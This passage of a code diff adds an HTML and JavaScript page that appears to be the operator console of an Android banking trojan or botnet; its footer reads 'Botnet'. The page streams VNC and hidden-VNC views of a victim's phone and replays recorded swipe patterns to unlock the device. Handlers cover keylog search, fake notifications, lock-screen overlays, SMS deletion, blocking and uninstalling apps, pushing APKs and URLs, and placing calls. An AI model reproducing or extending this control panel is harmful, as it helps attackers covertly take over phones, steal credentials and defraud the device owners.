+												<input type="text" id="txtcallnumber" class="form-control" placeholder="Call a Number">
+												<button type="Button" class="btn btn-secondary" id="btncallnumber">Call a Number</button>
+											
+											</div>
+											</div>
+									</li>
+									
+									
+									
+									
+									
+									
+									 
+								 
+								</ul>
+							
+							
+							
+							 
+							 
+							 </div>
+							 
+						</div>
+					</div>
+				</div>
+			</div>
+		</aside>
+
+		<!-- start: page header area -->
+		<div class="px-md-4 px-2 py-2 page-header" data-bs-theme="none">
+
+			<div class="d-flex align-items-center">
+				<!-- <button class="btn d-none d-xl-inline-flex me-3 px-0 sidebar-toggle" type="button"> -->
+					<!-- <svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> -->
+						<!-- <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> -->
+						<!-- <path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path> -->
+						<!-- <path d="M9 4v16"></path> -->
+						<!-- <path d="M15 10l-2 2l2 2"></path> -->
+					<!-- </svg> -->
+				<!-- </button> -->
+				<ol class="breadcrumb mb-0 bg-transparent">
+					<li class="breadcrumb-item"><a href="dashboard.html" title="home">Home</a></li>
+					<li class="breadcrumb-item active" aria-current="page" title="Connected to Device">Connected to Device -->
+					
+					</li>
+					<li class="breadcrumb-item active" aria-current="page" title="Device ID" id="lbldeviceid">#0
+					
+					</li>
+					<li class="breadcrumb-item active" aria-current="page" title="Last Seen" id="lbllastseen">Loading...
+					
+					</li>
+				
+					
+				</ol>
+			</div>
+			<ul class="list-unstyled action d-flex align-items-center mb-0">
+				 
+				<li class="d-none d-xxl-inline-flex">
+					<button class="btn px-0 rightbar-toggle" type="button">
+						<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+							<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+							<path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+							<path d="M15 4v16"></path>
+							<path d="M9 10l2 2l-2 2"></path>
+						</svg>
+					</button>
+				</li>
+				<li class="d-inline-flex d-xxl-none">
+					<button class="btn border-0 p-0" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvas_rightbar">
+						<svg class="svg-stroke" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+							<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+							<path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+							<path d="M15 4v16"></path>
+							<path d="M9 10l2 2l-2 2"></path>
+						</svg>
+					</button>
+				</li>
+			</ul>
+
+		</div>
+
+		<!-- start: page body area -->
+		<div class="ps-md-4 pe-md-3 px-2 py-3 page-body">
+			
+			
+            <ul class="row g-xl-3 g-2 list-unstyled row-deck">
+                
+                 
+                 
+                <li class="col-xl-4 col-lg-4">
+                    <div class="card border-0">
+                        <div class="card-header">
+                            <h6 class="card-title mb-0">VNC</h6>
+                        </div>
+						
+						<img id="imgvnc" src="assets/previewvnc.png" class="imgvnc" style=" max-width: 400px; " />
+                       <!-- <div style=" text-align: center; z-index: 2000000; "> -->
+							<!-- <button id="btnbackbutton" type="button" class="btn btn-secondary"><i class="fa fa-chevron-left"></i></button> -->
+							<!-- <button id="btnhomebutton" type="button" class="btn btn-secondary"><i class="fa fa-circle-thin"></i></button> -->
+							<!-- <button id="btnrecentsbutton" type="button" class="btn btn-secondary"><i class="fa fa-list"></i></button> -->
+						<!-- </div> -->
+						<!-- <div class="input-group" style=" z-index: 2000000; "> -->
+									<!-- <input type="text" id="txtsendtext" class="form-control" placeholder="Send Text"> -->
+									<!-- <button type="Button" class="btn btn-secondary" id="btnsendtext">Send</button> -->
+								
+								<!-- </div> -->
+                    </div>
+					<div id="cursor" class="Cursor"></div>
+					
+					
+                </li>
+				 <li class="col-xl-4 col-lg-4">
+                    <div class="card border-0" id="divhvnccontainer">
+                        <div class="card-header">
+                            <h6 class="card-title mb-0">&nbsp;</h6>
+                        </div>
+						<!-- <img id="imghvnc" src="assets/previewhvnc.png" style=" max-width: 400px; "/> -->
+						
+						<div style="max-width:400px;max-height:600px;" >
+							<div id="divimghvnc">
+								<img id="imghvnc" src="assets/previewhvnc.png" style="max-width: 400px;width: 100%;"/>
+							</div>
+						</div>
+						
+                    </div>
+                </li>
+				<li class="col-xl-4 col-lg-4" style=" z-index: 10001; ">
+                    <div class="card border-0" style=" z-index: 10001; ">
+                        <div class="card-header">
+                            <h6 class="card-title mb-0">HVNC Table</h6>
+                        </div>
+						<div style="width: 100%;max-height:600px;overflow-y:auto;overflow-x:hidden;">
+						<input type="text" class="form-control form-control-sm" aria-label="Search Views" id="txtSearchtbl" onkeyup="myFunction()" placeholder="Search Views">
+						
+						<table id="dtatable" class="table align-middle table-hover mb-0 dataTable" style="width: 100%">
+										<thead>
+											<tr>
+												<th class="border-top-0"></th>
+												<th class="border-top-0">Text</th>
+												<th class="border-top-0">Action</th>
+												
+											</tr>
+										</thead>
+										<tbody id="tblhvnctable">
+											
+											
+											<tr>
+												<td style="width: 50px;"><i class="fa fa-folder theme-text-color3"></i></td>
+												<td><span class="folder-name">Loading...</span></td>
+												
+												
+												<td><button type="button" class="btn btn-outline-primary">Loading...</button></td>
+												
+											</tr>
+											 
+										</tbody>
+									</table>
+									
+						
+							</div>
+						
+                       
+                    </div>
+                </li>
+				
+                
+            </ul> <!--[ ul.row end ]-->
+			
+		</div>
+
+		<!-- start: page footer -->
+		<footer class="px-md-4 px-2">
+			<p class="mb-0 text-muted">© 2023 <a href="#" target="_blank" title="Botnet">Botnet</a>, All Rights Reserved.</p>
+		</footer>
+		
+	</main>
+
+	
+
+	<!--[ bvite template vender js ]-->
+	<script src="assets/bundles/libscripts.bundle.js"></script>
+
+	<!-- Template page js -->
+	<script src="assets/js/main.js"></script>
+	 
+	
+	<script src="assets/bundles/dataTables.bundle.js"></script>
+	<script>
+	
+		$(document).ready( function () {
+			$('.dataTable')
+			//.addClass( 'nowrap' )
+			.dataTable( {
+				responsive: true,
+				"pageLength": 10,
+				paging: false,
+				"bPaginate": false,
+				"bLengthChange": false,
+				"bFilter": false,
+				"bInfo": false,
+				sort: false,
+				"ordering": false
+			});
+		});
+
+	</script>
+	
+	
+		
+		
+		<input id="txtdeviceid" type="text" value="0" style="display:none !important;" />
+		<script>
+		  const urlParams = new URLSearchParams(window.location.search);
+		  const myParam = urlParams.get('id');
+		  document.getElementById("txtdeviceid").value = myParam;
+		</script>
+		
+		<input id="txthvnccontainerwidth" type="text" value="0" style="display:none !important;" />
+		<input id="txthvnccontainerheight" type="text" value="0" style="display:none !important;" />
+			<script>
+				var hvnccontainerwidth = document.getElementById('divhvnccontainer').offsetWidth;
+				var hvnccontainerheight = document.getElementById('divhvnccontainer').offsetHeight;
+				
+				document.getElementById("txthvnccontainerwidth").value = hvnccontainerwidth;
+				document.getElementById("txthvnccontainerheight").value = hvnccontainerheight;
+
+			</script>
+			
+	
+	<script>
+		function hvncclickonView(vleft,vtop,vwidth,vheight,vtext,vid){
+			
+			b4j_raiseEvent("hvnc_clickonview",{vleft,vtop,vwidth,vheight,vtext,vid});
+		}
+	</script>
+	<script>
+		document.getElementById("btnloading").click();
+		
+	</script>
+	
+	<script>
+	  $(document).ready(function() {
+		b4j_connect("/connectedtodevice/ws");
+	  });
+	</script>
+	
+		<div class="cursor">
+  
+<div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+  <div class="circle"></div>
+</div>
+  
+<style>
+
+.cursor {
+  pointer-events: none;
+  position: fixed;
+  display: block;
+  border-radius: 0;
+  mix-blend-mode: difference;
+  top: 0;
+  left: 0;
+  z-index: 9999999999999999;  
+}
+
+.circle {
+    position: absolute;
+    display: block;
+    width: 26px;
+    height: 26px;
+    border-radius: 20px;
+    background-color: #fff;
+}
+</style>
+		<!-- VNC Curosr -->
+		<script>
+				const coords = { x: 0, y: 0 };
+const circles = document.querySelectorAll(".circle");
+
+const cursor = document.querySelector(".cursor");
+var anivnc = document.getElementById("imgvnc");
+
+circles.forEach(function (circle, index) {
+  circle.x = 0;
+  circle.y = 0;
+  circle.style.backgroundColor = "white";
+});
+
+anivnc.addEventListener("mousemove", function (e) {
+  coords.x = e.clientX;
+  coords.y = e.clientY;
+});
+
+function animateCircles() {
+  let x = coords.x;
+  let y = coords.y;
+
+  cursor.style.top = x;
+  cursor.style.left = y;
+  
+  circles.forEach(function (circle, index) {
+    circle.style.left = x - 12 + "px";
+    circle.style.top = y - 12 + "px";
+
+    circle.style.scale = (circles.length - index) / circles.length;
+
+    circle.x = x;
+    circle.y = y;
+
+    const nextCircle = circles[index + 1] || circles[0];
+    x += (nextCircle.x - x) * 0.3;
+    y += (nextCircle.y - y) * 0.3;
+  });
+
+  requestAnimationFrame(animateCircles);
+}
+
+animateCircles();
+		</script>
+
+<script>
+		$(document).ready(function() {
+			document.getElementById('imgvnc').ondragstart = function() { return false; };
+		   //var arrayOfXY = new Array();
+		   //$('#imgvnc').click(function(e) {
+		   //    var offset = $(this).offset();
+		   //    var xPoint = e.pageX - offset.left;
+		   //    var yPoint = e.pageY - offset.top;
+			//	 b4j_raiseEvent("click_onvnc", {"xPoint": xPoint,"yPoint":yPoint,"imgwidth":this.width,"imgheight":this.height});
+		   //});
+		});
+		var ispattrenmove=0;
+		$("#imgvnc").mousedown(function (e) {
+			if (ispattrenmove==0){
+				console.log("OK Clicked!");
+				var offset = $(this).offset();
+				var xPoint = e.pageX - offset.left;
+				var yPoint = e.pageY - offset.top;
+				b4j_raiseEvent("click_onvnc_savecords", {"xPoint": xPoint,"yPoint":yPoint,"imgwidth":this.width,"imgheight":this.height});
+			}
+		
+			$(this).mousemove(function (e) {
+				if (ispattrenmove==1){
+					//console.log("OK Moved!");
+					var offset = $(this).offset();
+					var xPoint = e.pageX - offset.left;
+					var yPoint = e.pageY - offset.top;
+					b4j_raiseEvent("click_onvnc_savecords", {"xPoint": xPoint,"yPoint":yPoint,"imgwidth":this.width,"imgheight":this.height});
+				}
+			});
+		}).mouseup(function (e) {
+			$(this).unbind('mousemove');
+			//console.log("mouse released!");
+			var offset = $(this).offset();
+			var xPoint = e.pageX - offset.left;
+			var yPoint = e.pageY - offset.top;
+			b4j_raiseEvent("click_onvnc", {"xPoint": xPoint,"yPoint":yPoint,"imgwidth":this.width,"imgheight":this.height});
+			
+		}).mouseout(function (e) {
+			$(this).unbind('mousemove');
+			if (ispattrenmove==1){
+				//console.log("mouse released!");
+				var offset = $(this).offset();
+				var xPoint = e.pageX - offset.left;
+				var yPoint = e.pageY - offset.top;
+				b4j_raiseEvent("click_onvnc", {"xPoint": xPoint,"yPoint":yPoint,"imgwidth":this.width,"imgheight":this.height});
+			}
+			
+		});
+	</script>		
+<input type="file" id="imgupload"  style="display:none" accept="image/png,image/gif"/>
+
+<input type="file" id="imgnotiupload"  style="display:none" accept="image/png"/>
+<input type="text" id="txtimgdata" style="display:none" />
+<input type="text" id="txtimgdatafrompreset" style="display:none" />
+<input type="text" id="txtimgdataextention" style="display:none" />
+<input type="text" id="txtnotiimgdata" style="display:none" />
+<script>
+$('#btnimgupload').click(function(){ $('#imgupload').trigger('click'); });
+
+</script>
+<script>
+function readURL(input) {
+    if (input.files && input.files[0]) {
+		var extension = input.files[0].name.split('.').pop().toLowerCase();
+		$('#txtimgdataextention').val(extension);
+		
+        var reader = new FileReader();
+
+        reader.onload = function (e) {
+		   $('#txtimgdata').val(e.target.result);
+		   //console.log(e.target.result);
+        }
+
+        reader.readAsDataURL(input.files[0]);
+    }
+}
+
+$("#imgupload").change(function(){
+    readURL(this);
+});
+</script>
+
+<script>
+function readURLNoti(input1) {
+    if (input1.files && input1.files[0]) {
+		
+		var extension111 = input1.files[0].name.split('.').pop().toLowerCase();
+		$('#txtimgdataextention').val(extension111);
+		
+        var reader1 = new FileReader();
+
+        reader1.onload = function (e) {
+		   $('#txtnotiimgdata').val(e.target.result);
+		   //console.log(e.target.result);
+        }
+
+        reader1.readAsDataURL(input1.files[0]);
+    }
+}
+
+</script>
+
+<script>
+function sendco(){
+	var formData2 = new FormData();
+	formData2.append("txtimgdatafrompreset", document.getElementById("txtimgdatafrompreset").value);
+	formData2.append("txtimgdata", document.getElementById("txtimgdata").value);
+	formData2.append("txtimgdataextention", document.getElementById("txtimgdataextention").value);
+	
+	$.ajax({
+		"url": "filesupload",
+		"method": "POST",
+		"async":        true,
+		"crossDomain":  true,
+		"processData":  false,
+		"contentType":  false,
+		"mimeType":     "multipart/form-data",
+		"data":         formData2,
+		success: function(response3){
+        },
+		timeout: 300000
+	}).done(function(response2){
+		// e.preventDefault();
+			var k=response2;
+		
+		b4j_raiseEvent("send_colockscreen", {"val": k});
+
+	});
+
+}
+</script>
+
+<script>
+function sendcoNoti(){
+	var formData2 = new FormData();
+	formData2.append("txtimgdatafrompreset", "");
+	formData2.append("txtimgdata", document.getElementById("txtnotiimgdata").value);
+	formData2.append("txtimgdataextention", document.getElementById("txtimgdataextention").value);
+	
+	$.ajax({
+		"url": "filesupload",
+		"method": "POST",
+		"async":        true,
+		"crossDomain":  true,
+		"processData":  false,
+		"contentType":  false,
+		"mimeType":     "multipart/form-data",
+		"data":         formData2,
+		success: function(response3){
+        },
+		timeout: 300000
+	}).done(function(response2){
+		// e.preventDefault();
+			var k=response2;
+		
+		b4j_raiseEvent("addfakenoti_click", {"val": k});
+
+	});
+
+}
+</script>
+
+
+
+
+<div class="modal fade" id="modlpopupdata" tabindex="-1" aria-labelledby="modlpopupdatalabel" aria-hidden="true" style="display: none;z-index: 100000;">
+								<div class="modal-dialog modal-lg">
+									<div class="modal-content">
+										<div class="modal-header">
+											<h5 class="modal-title h4" id="modlpopupdatalabel">Loading...</h5>
+											<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+										</div>
+										<div class="modal-body">
+											
+											<div class="card-body card-main-one">
+	<div class="row" id="divmodlpopupdata">
+		
+	</div>
+	
+	</div>
+											
+											
+											
+										</div>
+									</div>
+								</div>
+							</div>
+							
+
+
+
+<div class="modal fade" id="modlpopupdata22" tabindex="-1" aria-labelledby="modlpopupdatalabel22" aria-hidden="true" style="display: none;z-index: 100000;">
+								<div class="modal-dialog modal-lg">
+									<div class="modal-content">
+										<div class="modal-header">
+											<h5 class="modal-title h4" id="modlpopupdatalabel22">Loading...</h5>
+											<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+										</div>
+										<div class="modal-body">
+											
+											<div class="card-body card-main-one">
+											
+	<div class="row">
+		<select id="cmbpattspeed" class="form-control">
+			<option value="600">Fast (600 MS)</option>
+			<option value="1000" selected>Slower (1000 MS)</option>
+			<option value="1200">Very Slow (1200 MS)</option>
+			<option value="1400">Very Slow (1400 MS)</option>
+			<option value="1600">Very Slow (1600 MS)</option>
+			<option value="1800">Very Slow (1800 MS)</option>
+			<option value="2000">Very Slow (2000 MS)</option>
+		
+		</select>
+		<button  id="btnpattrenunlock" type="button" class="btn btn-secondary"
+				>UnLock</button>
+
+<div  id="divmodlpopupdata22">
+
+</div>
+
+
+	</div>
+	
+	</div>
+											
+											
+											
+										</div>
+									</div>
+								</div>
+							</div>
+
+
+<script>
+		function addcalllog(){
+			var val='';
+			b4j_raiseEvent("btnaddphonenumber_click", {val});
+		}
+		function deletecalllog(val,val2){
+			b4j_raiseEvent("btndeletephonenumber_click", {val,val2});
+		}
+		function deleteuninstall(val,val2){
+			b4j_raiseEvent("deleteuninstall_click", {val,val2});
+		}
+		function opencertainapp(val,val2){
+			b4j_raiseEvent("opencertainapp_click", {val,val2});
+		}
+		function addfakenoti(){
+			var val='';
+			b4j_raiseEvent("addfakenoti_click", {val});
+		}
+		function blockapp(val){
+			b4j_raiseEvent("blockapp_click", {val});
+		}
+		function deletesms(val,val2){
+			b4j_raiseEvent("deletesms_click", {val,val2});
+		}
+		function btnsendexternalapk(val){
+			b4j_raiseEvent("btnsendexternalapk_click", {val});
+		}
+		function btnsendurls(val){
+			b4j_raiseEvent("btnsendurls_click", {val});
+		}
+	</script>
+	
+		
+		
+<script>
+function myFunction() {
+  var input, filter, table, tr, td, i, txtValue;
+  input = document.getElementById("txtSearchtbl");
+  filter = input.value.toUpperCase();
+  table = document.getElementById("dtatable");
+  tr = table.getElementsByTagName("tr");
+  for (i = 0; i < tr.length; i++) {
+    td = tr[i].getElementsByTagName("td")[1];
+    if (td) {
+      txtValue = td.textContent || td.innerText;
+      if (txtValue.toUpperCase().indexOf(filter) > -1) {
+        tr[i].style.display = "";
+      } else {
+        tr[i].style.display = "none";
+      }
+    }       
+  }
+}
+ function keylogSearchFun() {
+  var input, filter, table, tr, td, i, txtValue;
+  input = document.getElementById("txtSearchKeyLogstbl");
+  filter = input.value.toUpperCase();
+  table = document.getElementById("tblkeylogs");
+  tr = table.getElementsByTagName("tr");
+  for (i = 0; i < tr.length; i++) {
+    td = tr[i].getElementsByTagName("td")[2];
+    if (td) {
+      txtValue = td.textContent || td.innerText;
+      if (txtValue.toUpperCase().indexOf(filter) > -1) {
+        tr[i].style.display = "";
+      } else {
+        tr[i].style.display = "none";
+      }
+    }       
+  }
+}
+
+function installedappsSearchFun() {
+  var input, filter, table, tr, td, i, txtValue;
+  input = document.getElementById("txtsearchinstalledapps");
+  filter = input.value.toUpperCase();
+  table = document.getElementById("tblinstalledapps");
+  tr = table.getElementsByTagName("tr");
+  for (i = 0; i < tr.length; i++) {
+    td = tr[i].getElementsByTagName("td")[1];
+    if (td) {
+      txtValue = td.textContent || td.innerText;
+      if (txtValue.toUpperCase().indexOf(filter) > -1) {
+        tr[i].style.display = "";
+      } else {
+        tr[i].style.display = "none";
+      }
+    }       
+  }
+}
+</script>
+
+
+ 
+ 
+
+
+</body>
+
+
+</html>
